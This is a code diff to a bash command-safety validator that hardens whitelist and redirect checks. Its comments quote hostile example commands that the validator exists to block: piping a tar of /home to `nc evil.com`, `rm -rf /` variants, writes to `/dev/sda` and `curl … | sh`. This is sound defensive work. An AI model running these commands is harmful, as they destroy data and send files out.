@@ -24,7 +24,7 @@ from schlock.integrations.shellcheck import (
 )
 
 from .cache import ValidationCache
-from .parser import WRAPPER_COMMANDS, BashCommandParser, heredoc_owner
+from .parser import FD_VARIABLE, WRAPPER_COMMANDS, BashCommandParser, has_compound_redirects, heredoc_owner
 from .rules import RiskLevel, RuleEngine, RuleMatch, SecurityRule
 from .substitution import SubstitutionValidationResult, SubstitutionValidator
 
@@ -635,8 +635,10 @@ def _shell_delegated_payloads(
     """Extract every argument the command will hand to a shell as source code.
 
     Covers `<shell> -c PROG`, the same behind an exec wrapper (`sudo`, `timeout 5`,
-    `env FOO=1`, `busybox`, `flock ...`), `watch PROG`, and `find -exec/-execdir/-ok/-okdir
-    <shell> -c PROG ;` (LAB-2767), whose clause re-enters this same extraction.
+    `env FOO=1`, `busybox`, `flock ...`), `watch PROG`, `find -exec/-execdir/-ok/-okdir
+    <shell> -c PROG ;` (LAB-2767), whose clause re-enters this same extraction, and
+    `git config <exec-key> PROG` (LAB-4264), whose hand-off is DEFERRED — git runs PROG through a
+    shell on every later git command in that repo or for that user, not at this command.
 
     Here-strings (`bash <<< "..."`) ride a redirect node the word-walker never sees, so they
     are surfaced by `parser.extract_stdin_program_redirects` instead and fed into the same
@@ -670,6 +672,15 @@ def _shell_delegated_payloads(
             raise ValueError(f"Shell delegation scan exceeded {MAX_DELEGATOR_TOKENS} delegator tokens")
         base = cmd_name.rsplit("/", 1)[-1]
         found = []
+
+        # `git config <exec-key> PROG` arms PROG for every later git command. Checked ahead of the
+        # delegator/wrapper split below, and for wrappers too, because a wrapper hands the whole
+        # command straight through (`timeout 5 git config core.pager PROG`) and this scan keys on
+        # the `config` token rather than on the first word.
+        if base == "git" or base in WRAPPER_COMMANDS:
+            from schlock.core.substitution import git_config_exec_payload  # noqa: PLC0415
+
+            found.append(git_config_exec_payload(args))
 
         if base == "watch":
             found.append(_watch_payload(args))
@@ -982,6 +993,7 @@ def _match_original_and_reconstructed(
     string_literals: list[tuple],
     quote_source: str,
     heredoc_ranges: Optional[list[tuple]] = None,
+    use_whitelist: bool = True,
 ) -> RuleMatch:
     """Match `command` against the rules as written AND quote/escape-stripped.
 
@@ -1021,9 +1033,23 @@ def _match_original_and_reconstructed(
                       not a silent wrong answer. Only quote detection uses it; the
                       ranges returned are offsets into the reconstruction, which
                       is built from `ast_nodes` alone either way.
-        heredoc_ranges: Heredoc ranges for the original-form pass only: heredoc
-                        bodies never reach the reconstruction, since
-                        _collect_words walks `.word` parts alone.
+        heredoc_ranges: Heredoc ranges for the original-form pass only. A body parked
+                        on `redirect.heredoc` never reaches a reconstruction, because
+                        `_redirect_words` reads only `redirect.output`, the delimiter.
+                        Two bodies still do: one carried verbatim inside a
+                        command-substitution word, which `_reconstruct` suppresses
+                        itself (a `<( … )` body is never inert, so never suppressed),
+                        and one inside a compound, where bashlex parses the
+                        body as commands (`{ cat <<EOF … } > f; echo b` reconstructs
+                        with the body's words). The second can only over-block.
+        use_whitelist: Whether the whitelist may short-circuit ANY of the three forms.
+                       One switch for all three, deliberately: the whitelist is
+                       prefix-based, so a caller that needs it off (the compound
+                       whole-command pass, where a leading `ls` would otherwise
+                       vouch for a later redirect) needs it off for the original
+                       form too. Applying it to the reconstructions alone worked
+                       only because a compound's reconstruction never equals its
+                       source, which is an accident of shape, not a guarantee.
 
     Returns:
         The higher-risk of the two matches.
@@ -1032,13 +1058,24 @@ def _match_original_and_reconstructed(
         command,
         string_literals=string_literals,
         heredoc_ranges=heredoc_ranges,
+        use_whitelist=use_whitelist,
     )
 
-    reconstructed, suppression_ranges = parser.reconstruct_command_with_suppression_ranges(quote_source, ast_nodes)
-    if reconstructed and reconstructed != command:
-        recon_match = engine.match_command(reconstructed, string_literals=suppression_ranges)
-        if recon_match.risk_level > match.risk_level:
-            return recon_match
+    # Three forms, highest risk wins. The two reconstructions are NOT a before/after
+    # pair - each is the only form a whole family of rules can match (LAB-2760):
+    # `>\s*/dev/sd[a-z]` needs the redirect present, while rule 08's `[^>]{0,200}`
+    # and rule 03's `^\s*env\s*$` only match once it is gone.
+    seen = {command}
+    for form, ranges in (
+        parser.reconstruct_command_with_suppression_ranges(quote_source, ast_nodes),
+        parser.reconstruct_without_redirects(quote_source, ast_nodes),
+    ):
+        if not form or form in seen:
+            continue
+        seen.add(form)
+        form_match = engine.match_command(form, string_literals=ranges, use_whitelist=use_whitelist)
+        if form_match.risk_level > match.risk_level:
+            match = form_match
 
     return match
 
@@ -1148,13 +1185,13 @@ _FRESH, _TIME, _TIMEP, _REDIR, _ASSIGNED, _COPROC, _NAMED, _LOST = (
 )
 _RESERVED_WORDS = frozenset(("if", "then", "elif", "else", "while", "until", "do", "!", "{"))
 _ASSIGNMENT_WORD_RE = re.compile(r"[A-Za-z_]\w*(\[.*\])?\+?=", re.DOTALL)  # `x=`, `a[1]=`, `x+=`, quotes and all after
-_REDIRECT_WORD_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\})[<>]|&>")  # `<`, `2>`, `{fd}>`, `&>`, `<<'E'`, `<<<`
+_REDIRECT_WORD_RE = re.compile(rf"([0-9]*|{FD_VARIABLE})[<>]|&>")  # `<`, `2>`, `{fd}>`, `&>`, `<<'E'`, `<<<`
 # What a word may hold and still absorb a following `<` or `>`: an fd prefix,
 # or the first character of a two-character operator (`>>`, `<>`, `&>>`).
-_FD_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\}|&)[<>]?")
+_FD_RE = re.compile(rf"([0-9]*|{FD_VARIABLE}|&)[<>]?")
 # `2>&-` closes the descriptor: the `-` is the whole target even glued, so
 # `2>&-a[0]=1` is a redirection and then an assignment (verified).
-_FD_CLOSE_RE = re.compile(r"([0-9]*|\{[A-Za-z_]\w*\})[<>]&")
+_FD_CLOSE_RE = re.compile(rf"([0-9]*|{FD_VARIABLE})[<>]&")
 _ASSIGNMENT_PREFIX_RE = re.compile(r"[A-Za-z_]\w*(\[.*\])?\+?=", re.DOTALL)  # `x=(…)` opens a compound assignment
 _IDENTIFIER_RE = re.compile(r"[A-Za-z_]\w*")
 # Blanks and control-operator characters end a word at the top level. `<` and
@@ -2390,11 +2427,9 @@ def _escalate_past_heredoc(
     The rewritten command is validated through the front door, so it gets the
     whole pipeline - segments, substitutions, dangerous flags, rules - rather
     than a second hand-rolled approximation of it. Its segments are then
-    validated individually as well, because a full-span whitelist entry
-    short-circuits the whole-command pass before the per-segment loop it relies
-    on. A whitelisted *prefix* used to do the same; #146 (LAB-2752) narrowed
-    that gate to `is_fully_whitelisted`, so the prefix case no longer reaches
-    it, but an end-anchored entry still does.
+    validated individually as well, because a whitelist entry that declares every
+    command in the line (`is_whitelisted_whole`) short-circuits the whole-command
+    pass before the per-segment loop it relies on; one such entry is enough.
     Neither pass subsumes the other: the whole-command pass is the only one that
     sees `curl … | sh` as a pipeline, the per-segment pass is the only one the
     whitelist cannot silence.
@@ -2402,7 +2437,7 @@ def _escalate_past_heredoc(
     Both passes run with ShellCheck off, and ShellCheck runs once here, on the
     whole rewrite. It is a subprocess per call, so leaving it on in every pass
     cost N+2 spawns for a heredoc followed by N commands (LAB-2780). It cannot
-    simply stay on in the whole-command pass alone: a full-span whitelist entry
+    simply stay on in the whole-command pass alone: a whole-line whitelist entry
     short-circuits that pass before its ShellCheck step, and the per-segment
     pass is then the only place the trailing commands are ShellChecked at all -
     `"rm" -rf /` and `rm -$''rf /` are caught by nothing else. Running it here
@@ -2830,18 +2865,21 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
 
             # If we have multiple segments, validate each one
             if len(segments) > 1:
-                # Full-command whitelist check before segment validation.
-                # Per-segment validation cannot detect safe multi-command patterns
-                # (e.g., "gh auth token | docker login ... --password-stdin") because
-                # each segment is evaluated in isolation. Whitelisting the full command
-                # here allows specific safe pipe patterns without whitelisting the
-                # constituent commands standalone.
+                # Full-command whitelist check before segment validation, for the safe
+                # multi-command patterns per-segment validation cannot see: `gh auth token`
+                # alone is credential theft, and only the whole pipe to `docker login
+                # --password-stdin` is safe. That entry is the reason this fast path exists.
                 #
-                # SECURITY CRITICAL: the pattern must span the WHOLE command, not just
-                # its prefix (is_fully_whitelisted, not is_whitelisted). A prefix match
-                # would let the whitelisted "ls" in "ls; rm -rf /" vouch for every later
-                # segment and skip the loop below entirely.
-                if engine.is_fully_whitelisted(parse_target):
+                # SECURITY: it must take a whitelist entry that describes THIS MANY commands,
+                # which `is_whitelisted_whole` decides and `is_whitelisted` does not. A prefix
+                # test here handed every single-command entry the rest of the line — so
+                # `ls && rm -rf /` cleared on its first two characters, past the very segment
+                # loop below that exists to catch it. Neither anchoring nor merely mentioning a
+                # separator is sufficient; the segment count is what the entry is held to, so
+                # it is passed in. Do NOT "simplify" this back to `is_whitelisted` (LAB-4290).
+                # `parse_target`, not `command`: the count comes from segments sliced out of
+                # the normalised string, so the entry must be matched against that same string.
+                if engine.is_whitelisted_whole(parse_target, len(segments)):
                     result = ValidationResult(
                         allowed=True,
                         risk_level=RiskLevel.SAFE,
@@ -2884,11 +2922,39 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         highest_risk = seg_match.risk_level
                         highest_match = seg_match
 
+                # SECURITY (LAB-2760): a compound's redirections hang off the
+                # COMPOUND node, and _segment_nodes recurses past it into `.list`,
+                # so they belong to no segment and no per-segment reconstruction
+                # can carry them - `while true; do echo a; done > "/dev/sda"` was
+                # SAFE while the unquoted form was BLOCKED. Only a whole-command pass
+                # sees them. The unconditional scan below matches the unreconstructed
+                # text only, where two quote characters hide the target, so this
+                # pass matches the reconstructions and feeds its result into it.
+                # Whitelist OFF: it is prefix-based, so a leading `ls` would vouch
+                # for a later redirect. Safe to turn off here because this pass can
+                # only raise the verdict, never lower it.
+                if has_compound_redirects(ast):
+                    whole = _match_original_and_reconstructed(
+                        engine,
+                        parser,
+                        parse_target,
+                        ast,
+                        string_literals=string_literals,
+                        heredoc_ranges=heredoc_ranges,
+                        quote_source=parse_target,
+                        use_whitelist=False,
+                    )
+                    if whole.risk_level > highest_risk:
+                        highest_risk = whole.risk_level
+                        highest_match = whole
+                        if whole.matched and whole.rule:
+                            all_matched_rules.append(whole.rule.name)
+
                 # Re-check the whole command so cross-segment rules (e.g. "tar ... | nc ...")
                 # fire, and take the higher of it and the segments. Unconditional: a rule a
                 # segment matched says nothing about a rule only the whole command can match.
                 # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
-                # already settled above by is_fully_whitelisted(). match_command()'s
+                # already settled above by is_whitelisted_whole(). match_command()'s
                 # own whitelist check is prefix-based, and honouring it here would let
                 # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
                 match = engine.match_command(parse_target, string_literals=string_literals, use_whitelist=False)
@@ -2974,8 +3040,10 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
         # Step 5c: shell-delegated payloads (LAB-2754).
         # `bash -c PROG` / `watch PROG` execute PROG. Re-enter validation on it and take the
         # higher verdict, so no spelling of the wrapper scores below the bare payload.
-        # NOT a general guarantee: this runs after the multi-segment whitelist, so a full-span
-        # whitelist match still short-circuits it (#146 closed the prefix case). Deliberately NOT routed through
+        # NOT a general guarantee: this runs after the multi-segment whitelist, so a whitelist
+        # entry that covers the whole line still short-circuits it — which since #146 and
+        # LAB-4290 means a deliberate pipeline entry only, not any entry whose prefix happens
+        # to match (LAB-2759). Deliberately NOT routed through
         # SubstitutionValidator - that one is whitelist-first default-DENY, and re-entering the
         # top-level entry point here keeps `bash -c "git push --force"` at HIGH rather than
         # BLOCKED.
